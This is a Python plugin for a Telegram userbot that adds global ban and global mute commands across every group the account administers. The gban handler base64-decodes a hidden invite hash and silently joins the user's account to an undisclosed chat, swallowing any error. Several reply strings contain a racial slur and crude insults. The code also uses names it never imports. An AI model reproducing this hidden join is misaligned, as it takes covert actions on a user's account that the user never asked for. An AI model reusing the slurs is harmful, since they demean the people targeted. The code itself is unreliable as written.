import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChatBannedRights

import userbot.plugins.sql_helper.gban_sql_helper as gban_sql

from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
from userbot.cmdhelp import CmdHelp
from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, hell_ID
from userbot.plugins.sql_helper.mute_sql import is_muted, mute, unmute

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)

async def get_user_from_event(event, secondgroup=None):
    if secondgroup:
        args = event.pattern_match.group(2).split(" ", 1)
    else:
        args = event.pattern_match.group(1).split(" ", 1)
    extra = None
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        user_obj = await event.client.get_entity(previous_message.sender_id)
        extra = event.pattern_match.group(1)
    elif args:
        user = args[0]
        if len(args) == 2:
            extra = args[1]
        if user.isnumeric():
            user = int(user)
        if not user:
            await edit_or_reply(event, "`Pass the user's username, id or reply!`")
            return None, None
        if event.message.entities:
            probable_user_mention_entity = event.message.entities[0]
            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
                user_id = probable_user_mention_entity.user_id
                user_obj = await event.client.get_entity(user_id)
                return user_obj, extra
        try:
            user_obj = await event.client.get_entity(user)
        except (TypeError, ValueError):
            return None, None
    return user_obj, extra

async def admin_groups(kraken):
    krakengroups = []
    async for dialog in kraken.client.iter_dialogs():
        entity = dialog.entity
        if (
            isinstance(entity, Channel)
            and entity.megagroup
            and (entity.creator or entity.admin_rights)
        ):
            krakengroups.append(entity.id)
    return krakengroups

@bot.on(admin_cmd(pattern=r"gban(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"gban(?: |$)(.*)", allow_sudo=True))
async def hellgban(hell):
    if hell.fwd_from:
        return
    hellbot = await edit_or_reply(hell, "Global Ban is Coming🔥🔥\nWait and watch you bitch🚶")
    start = datetime.now()
    user, reason = await get_user_from_event(hell)
    if not user:
        return
    if user.id == (await hell.client.get_me()).id:
        await hellbot.edit("Hum to chutiye hai🚶")
        return
    if user.id in hell_ID:
        await hellbot.edit("why would I ban my dev")
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await hell.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await hellbot.edit(
            f"[user](tg://user?id={user.id}) `is already in gban list. wew.`"
        )
    else:
        gban_sql.hellgban(user.id, reason)
    gbun = []
    gbun = await admin_groups(hell)
    count = 0
    gbamm = len(gbun)
    if gbamm == 0:
        await hellbot.edit("You aren't admin in a single group.")
        return
    await hellbot.edit(
        f"Initiating gban of the [user](tg://user?id={user.id}) in `{len(gbun)}` groups"
    )
    for i in range(gbamm):
        try:
            await hell.client(EditBannedRequest(gbun[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await hell.client.send_message(
                BOTLOG_CHATID,
                f"You don't have required permission in :\nCHAT: {hell.chat.title}(`{hell.chat_id}`)\nFor banning here",
            )
    try:
        reply = await hell.get_reply_message()
        if reply:
            await reply.delete()
    except BadRequestError:
        await hellbot.edit(
            "`Gabanned this retard and added to Gban watch Successfully....`"
        )
    end = datetime.now()
    helltaken = (end - start).seconds
    if reason:
        await hellbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups and added to gban watch.\n\nTime taken:- `{helltaken} seconds`!!\n\nReason: `{reason}`"
        )
    else:
        await hellbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was gbanned in `{count}` groups and added to gban watch\n\nTime Taken:- `{helltaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        await hell.client.send_message(
            BOTLOG_CHATID,
            f"#GBAN\nGlobal BAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: `{user.id}`\
                                                \nReason: `{reason}`\nBanned in `{count}` groups\nTime taken = `{helltaken} seconds`",
        )


@bot.on(admin_cmd(pattern=r"ungban(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"ungban(?: |$)(.*)", allow_sudo=True))
async def hellgban(hell):
    if hell.fwd_from:
        return
    hellbot = await edit_or_reply(hell, "Giving another chance.\n`Ungbaning...`")
    start = datetime.now()
    user, reason = await get_user_from_event(hell)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.hellungban(user.id)
    else:
        await hellbot.edit(
            f"the [user](tg://user?id={user.id}) is not in your gbanned list"
        )
        return
    gbun = []
    gbun = await admin_groups(hell)
    count = 0
    gbamm = len(gbun)
    if gbamm == 0:
        await hellbot.edit("You aren't admin in a single group.")
        return
    await hellbot.edit(
        f"Initiating ungban of the [user](tg://user?id={user.id}) in `{len(gbun)}` groups"
    )
    for i in range(gbamm):
        try:
            await hell.client(EditBannedRequest(gbun[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await hell.client.send_message(
                BOTLOG_CHATID,
                f"You don't have required permission in :\nCHAT: {hell.chat.title}(`{hell.chat_id}`)\nFor unbaning here",
            )
    end = datetime.now()
    helltaken = (end - start).seconds
    if reason:
        await hellbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in `{count}` groups and removed from gban watch.\n\nTime Taken:- `{helltaken} seconds`!!\n\nReason: `{reason}`"
        )
    else:
        await hellbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) was ungbanned in`{count}` groups and removed from gban watch.\n\nTime Taken:- `{helltaken} seconds`!!"
        )

    if BOTLOG and count != 0:
        await hell.client.send_message(
            BOTLOG_CHATID,
            f"#UNGBAN\nGlobal UNBAN\nUser: [{user.first_name}](tg://user?id={user.id})\nID: {user.id}\
                                                \nReason: `{reason}`\nUnbanned in `{count}` groups\nTime taken = `{helltaken} seconds`",
        )


@bot.on(admin_cmd(pattern="listgban$"))
@bot.on(sudo_cmd(pattern=r"listgban$", allow_sudo=True))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "Current Gbanned Users\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) for {a_user.reason}\n"
            else:
                GBANNED_LIST += (
                    f"👉 [{a_user.chat_id}](tg://user?id={a_user.chat_id}) Reason None\n"
                )
    else:
        GBANNED_LIST = "no Gbanned Users (yet)"
    if len(GBANNED_LIST) > 4095:
        with io.BytesIO(str.encode(GBANNED_LIST)) as out_file:
            out_file.name = "Gbannedusers.text"
            await event.client.send_file(
                event.chat_id,
                out_file,
                force_document=True,
                allow_cache=False,
                caption="Current Gbanned Users",
                reply_to=event,
            )
            await event.delete()
    else:
        await edit_or_reply(event, GBANNED_LIST)


@bot.on(admin_cmd(outgoing=True, pattern=r"gmute ?(\d+)?"))
@bot.on(sudo_cmd(pattern=r"gmute ?(\d+)?", allow_sudo=True))
async def startgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("Preparing to gmute this nigga!")
        await asyncio.sleep(3)
        private = True

    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await edit_or_reply(
            event, "Please reply to a user or add their into the command to gmute them."
        )
    replied_user = await event.client(GetFullUserRequest(userid))
    if is_muted(userid, "gmute"):
        return await edit_or_reply(event, "This user is already gmuted")
    try:
        mute(userid, "gmute")
    except Exception as e:
        await edit_or_reply(event, "Error occured!\nError is " + str(e))
    else:
        await edit_or_reply(event, "Abb bol. Abb Boll\nAbb Bol naa madarchoodd😃")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#GMUTE\n"
            f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"CHAT: {event.chat.title}(`{event.chat_id}`)",
        )


@bot.on(admin_cmd(outgoing=True, pattern=r"ungmute ?(\d+)?"))
@bot.on(sudo_cmd(pattern=r"ungmute ?(\d+)?", allow_sudo=True))
async def endgmute(event):
    private = False
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit("Okok. Ungmuting this shit-head!")
        await asyncio.sleep(3)
        private = True
    reply = await event.get_reply_message()

    if event.pattern_match.group(1) is not None:
        userid = event.pattern_match.group(1)
    elif reply is not None:
        userid = reply.sender_id
    elif private is True:
        userid = event.chat_id
    else:
        return await edit_or_reply(
            event,
            "Please reply to a user or add their username into the command to ungmute them.",
        )
    replied_user = await event.client(GetFullUserRequest(userid))
    if not is_muted(userid, "gmute"):
        return await edit_or_reply(event, "This user is not gmuted")
    try:
        unmute(userid, "gmute")
    except Exception as e:
        await edit_or_reply(event, "Error occured!\nError is " + str(e))
    else:
        await edit_or_reply(event, "Majdur ko khodna. Aur tere baap ko chodna.\nKabhi sikhana nhi🚶🔥")
    if BOTLOG:
        await event.client.send_message(
            BOTLOG_CHATID,
            "#UNGMUTE\n"
            f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
            f"CHAT: {event.chat.title}(`{event.chat_id}`)",
        )


@command(incoming=True)
async def watcher(event):
    if is_muted(event.sender_id, "gmute"):
        await event.delete()

CmdHelp("gban_gmute").add_command(
  'gban', '<reply to user> / <username/id>', 'Gban the retarded user. Reply to user/give username/id. Bans in all the groups you are admin in'
).add_command(
  'ungban', '<reply> / <usrname/id>', 'Ungbans the user. Grants another chance'
).add_command(
  'gmute', '<reply> / <username/id>', 'Gmutes the user in all the chats you are admin in with Delete message right'
).add_command(
  'ungmute', '<reply> / <username/id>', 'Ungmute the user in all chats'
).add()